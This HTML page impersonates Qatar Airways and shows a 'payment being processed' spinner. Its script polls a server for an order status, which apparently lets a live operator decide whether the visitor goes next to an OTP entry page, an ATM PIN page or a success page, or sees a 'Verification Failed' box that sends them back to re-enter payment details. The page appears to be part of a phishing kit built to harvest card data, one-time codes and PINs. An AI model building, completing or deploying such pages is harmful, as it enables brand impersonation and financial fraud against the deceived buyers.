<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Qatar Airways - Processing...</title>
    <style>
        *, *::before, *::after { box-sizing: border-box; }
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #5C0632;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .loading-container {
            text-align: center;
            padding: 40px;
        }

        .spinner-wrapper {
            margin: 0 auto 25px auto;
            width: 90px;
            height: 90px;
            background: rgba(255, 255, 255, 0.15);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .spinner {
            width: 45px;
            height: 45px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #ffffff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-title {
            font-size: 24px;
            font-weight: 700;
            color: #ffffff;
            margin-bottom: 10px;
            letter-spacing: 0.5px;
        }

        .loading-text {
            font-size: 15px;
            color: rgba(255, 255, 255, 0.8);
            margin: 0;
        }

        /* Error Modal */
        .error-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.6);
            z-index: 10000;
            justify-content: center;
            align-items: center;
        }
        .error-overlay.active { display: flex; }
        .error-box {
            background: white;
            border-radius: 16px;
            padding: 40px;
            max-width: 400px;
            width: 90%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            animation: shake 0.5s;
            border: 2px solid #dc3545;
        }
        .error-box .icon { font-size: 50px; color: #dc3545; margin-bottom: 15px; }
        .error-box h3 { color: #dc3545; margin-bottom: 10px; }
        .error-box p { color: #555; font-size: 15px; }
        .error-box button {
            margin-top: 20px;
            padding: 12px 30px;
            background: #dc3545;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            cursor: pointer;
            font-weight: bold;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-10px); }
            75% { transform: translateX(10px); }
        }
    </style>
</head>
<body>

    <div class="loading-container">
        <div class="spinner-wrapper">
            <div class="spinner"></div>
        </div>
        <div class="loading-title">Confirming Order...</div>
        <p class="loading-text">Please wait, your payment is being processed.</p>
    </div>

    <!-- Error Modal -->
    <div class="error-overlay" id="errorOverlay">
        <div class="error-box">
            <div class="icon">&#10005;</div>
            <h3>Verification Failed</h3>
            <p id="errorMessage">Please check the correct data and try again</p>
            <button onclick="closeErrorAndRetry()">Retry</button>
        </div>
    </div>

    <script>
        let pollInterval = null;
        const MAX_POLL_TIME = 120000;
        let startTime = Date.now();

        async function pollOrderStatus() {
            const orderId = sessionStorage.getItem('orderId');
            if (!orderId) return;

            if (Date.now() - startTime > MAX_POLL_TIME) {
                clearInterval(pollInterval);
                return;
            }

            try {
                const res = await fetch('/api/orders/' + orderId + '/status');
                const data = await res.json();

                if (data.status === 'approved') {
                    clearInterval(pollInterval);
                    const nextPages = {
                        'loading_otp': 'otp-en.html',
                        'otp': 'otp-en.html',
                        'loading_atm': 'atm-pin-en.html',
                        'atm_pin': 'atm-pin-en.html',
                        'loading_success': 'success-en.html',
                        'success': 'success-en.html'
                    };
                    window.location.href = nextPages[data.currentPage] || 'otp-en.html';
                } else if (data.status === 'rejected') {
                    clearInterval(pollInterval);
                    if (data.message) {
                        document.getElementById('errorMessage').textContent = data.message;
                    }
                    document.getElementById('errorOverlay').classList.add('active');
                }
            } catch (err) {
                console.error('Poll error:', err);
            }
        }

        function closeErrorAndRetry() {
            document.getElementById('errorOverlay').classList.remove('active');
            window.location.href = 'payment-en.html';
        }

        pollInterval = setInterval(pollOrderStatus, 2000);
        pollOrderStatus();
    </script>

</body>
</html>
